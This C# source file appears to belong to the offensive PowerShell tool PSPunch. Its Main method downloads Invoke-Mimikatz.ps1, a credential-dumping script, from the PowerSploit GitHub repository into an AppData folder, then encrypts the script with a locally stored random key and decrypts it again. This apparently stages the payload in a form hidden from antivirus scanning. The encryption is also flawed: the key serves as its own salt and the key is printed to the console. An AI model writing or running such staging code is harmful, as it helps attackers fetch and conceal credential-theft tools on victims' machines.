using System;
using System.IO;
using System.Security;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;
using System.Collections.Generic;

namespace PSCryptUtil
{
    class Program
    {
        static string RandomString(int size)
        {
            char[] chars = new char[62];
            chars =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890".ToCharArray();
            byte[] data = new byte[1];
            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
            {
                crypto.GetNonZeroBytes(data);
                data = new byte[size];
                crypto.GetNonZeroBytes(data);
            }
            StringBuilder result = new StringBuilder(size);
            foreach (byte b in data)
            {
                result.Append(chars[b % (chars.Length)]);
            }
            return result.ToString(); ;
        }

        static string GetPSPunchDir()
        {
            string PSPunchDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "PSPunch");
            if (!(Directory.Exists(PSPunchDir)))
            {
                Directory.CreateDirectory(PSPunchDir);
            }
            return PSPunchDir;
        }

        static string DownloadFile(string url, string dest)
        {
            string DownloadPath = Path.Combine(GetPSPunchDir(), dest);
            WebClient wc = new WebClient();
            wc.DownloadFile(url, DownloadPath);
            return DownloadPath;
        }

        static string GenerateKey()
        {
            string keyPath = Path.Combine(GetPSPunchDir(), "key.txt");
            if (!(File.Exists(keyPath)))
            {
                //string[] keys = new string[] { RandomString(32), RandomString(16) };
                //File.WriteAllLines(@keyPath, keys, Encoding.Unicode);

                string key = RandomString(64);
                File.WriteAllText(keyPath, key, Encoding.Unicode);
            }
            return File.ReadAllText(keyPath, Encoding.Unicode);
        }

        static void EncryptFile(string inputFile, string outputFile, string key)
        {
            byte[] keyBytes;
            keyBytes = Encoding.Unicode.GetBytes(key);

            Rfc2898DeriveBytes derivedKey = new Rfc2898DeriveBytes(key, keyBytes);

            RijndaelManaged rijndaelCSP = new RijndaelManaged();
            rijndaelCSP.Key = derivedKey.GetBytes(rijndaelCSP.KeySize / 8);
            rijndaelCSP.IV = derivedKey.GetBytes(rijndaelCSP.BlockSize / 8);

            ICryptoTransform encryptor = rijndaelCSP.CreateEncryptor();

            FileStream inputFileStream = new FileStream(inputFile, FileMode.Open, FileAccess.Read);

            byte[] inputFileData = new byte[(int)inputFileStream.Length];
            inputFileStream.Read(inputFileData, 0, (int)inputFileStream.Length);

            FileStream outputFileStream = new FileStream(outputFile, FileMode.Create, FileAccess.Write);

            CryptoStream encryptStream = new CryptoStream(outputFileStream, encryptor, CryptoStreamMode.Write);
            encryptStream.Write(inputFileData, 0, (int)inputFileStream.Length);
            encryptStream.FlushFinalBlock();

            rijndaelCSP.Clear();
            encryptStream.Close();
            inputFileStream.Close();
            outputFileStream.Close();
        }

        static void DecryptFile(string inputFile, string outputFile, string key)
        {
            byte[] keyBytes = Encoding.Unicode.GetBytes(key);

            Rfc2898DeriveBytes derivedKey = new Rfc2898DeriveBytes(key, keyBytes);

            RijndaelManaged rijndaelCSP = new RijndaelManaged();
            rijndaelCSP.Key = derivedKey.GetBytes(rijndaelCSP.KeySize / 8);
            rijndaelCSP.IV = derivedKey.GetBytes(rijndaelCSP.BlockSize / 8);
            ICryptoTransform decryptor = rijndaelCSP.CreateDecryptor();

            FileStream inputFileStream = new FileStream(inputFile, FileMode.Open, FileAccess.Read);

            CryptoStream decryptStream = new CryptoStream(inputFileStream, decryptor, CryptoStreamMode.Read);

            byte[] inputFileData = new byte[(int)inputFileStream.Length];
            decryptStream.Read(inputFileData, 0, (int)inputFileStream.Length);

            FileStream outputFileStream = new FileStream(outputFile, FileMode.Create, FileAccess.Write);
            outputFileStream.Write(inputFileData, 0, inputFileData.Length);
            outputFileStream.Flush();

            rijndaelCSP.Clear();

            decryptStream.Close();
            inputFileStream.Close();
            outputFileStream.Close();
        }

        static void Main(string[] args)
        {
            Dictionary<string, string> fileDict = new Dictionary<string, string>();
            fileDict.Add("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1", "invoke-mimikatz.ps1");
            string key = GenerateKey();
            foreach(KeyValuePair<string, string> entry in fileDict)
            {
                Console.WriteLine("Read from file: {0}", key);
                string downloadDest = DownloadFile(entry.Key, entry.Value);
                string encFile = downloadDest + ".enc";
                EncryptFile(downloadDest, encFile, key);
                string decFile = downloadDest + ".dec";
                DecryptFile(encFile, decFile, key);
            }
            

        }
    }
}
